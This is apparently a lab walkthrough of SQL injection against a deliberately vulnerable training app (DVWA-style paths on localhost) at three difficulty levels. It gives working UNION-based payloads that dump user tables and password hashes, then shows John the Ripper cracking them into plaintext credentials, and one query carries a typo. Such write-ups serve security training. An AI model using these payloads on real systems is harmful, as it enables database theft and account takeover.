# SQL Injection

# Low level

## Initial injection

**Payloads:**
* 1' (error)
* 1'' (success)

## Getting number of columns required
```
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- - (FAIL)
```

**Result:**

Number of columns **is equal 2**.

**Obs.:** You can also use the hash symbol comment at the end, for Example: 
```1' ORDER BY 1#```

## Listing all tables
```SQL
1' UNION SELECT table_name, NULL FROM information_schema.tables; #
```

> http://localhost/vulnerabilities/sqli/?id=1'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+%23&Submit=Submit


## Getting columns from users table
```SQL
1' UNION SELECT column_name, NULL FROM informatio_schema.columns WHERE table_name = 'users'
```

> http://localhost/vulnerabilities/sqli/?id=4'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name+%3d+'users'%3b+%23&Submit=Submit


## Getting users passwords
```SQL
1' UNION SELECT user, password FROM users
```

> http://localhost/vulnerabilities/sqli/?id=4%27+UNION+SELECT+user+,+password+FROM+users%3B+%23&Submit=Submit

# Medium Level

## Initial injection

POST via Burpsuite:

> id=1 OR 1=1&Submit=Submit

Encoded:
> id=1+OR+1%3d1&Submit=Submit

or inject the SQL code in any dropdown option and then submit it:

```HTML
<select name="id">
    <option value="1 OR 1=1">1</option>
    <option value="2">2</option>
    <option value="3">3</option>
    <option value="4">4</option>
    <option value="5">5</option>
</select>
```

Original query:

```PHP
"SELECT first_name, last_name FROM users WHERE user_id = $id;"; 
```

Resulting query after injection:

```SQL
SELECT first_name, last_name FROM users WHERE user_id = 1 OR 1=1; 
```

## Getting numbers of columns required:

> id=1+ORDER+BY+1&Submit=Submit ``(OK)``

> id=1+ORDER+BY+2&Submit=Submit ``(OK)``

> id=1+ORDER+BY+3&Submit=Submit ``(Unknown column '3' in 'order clause')``

**OBS.: THE REST OF THE STEPS ARE THE SAME OR SIMILAR AS TO THE LOW LEVEL.**

## Getting user passwords

> id=1+UNION+SELECT+user,+password+FROM+users&Submit=Submit

or:

```HTML
<select name="id">
    <option value="1 UNION SELECT user, password FROM users">1</option>
    <option value="2">2</option>
    <option value="3">3</option>
    <option value="4">4</option>
    <option value="5">5</option>
</select>
```

# High Level

> This is very similar to the low level, however this time the attacker is inputting the value in a different manner. The input values are being transferred to the vulnerable query via session variables using another page, rather than a direct GET request.

## Getting user passwords

Through the screen field:
```SQL
1' UNION SELECT user, password FROM users #
```

Or through request:

> id=1'+UNION+SELECT+user,+password+FROM+users+%23&Submit=Submit

# Cracking user passwords

John Ripper was used to crack the passwords. Below is the command used:

**Passwords:**
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
```


```
john --show --format=Raw-MD5 passwords
```

**Result:**

```
admin:password
gordonb:abc123
1337:charley
pablo:letmein
smithy:password

5 password hashes cracked, 0 left
```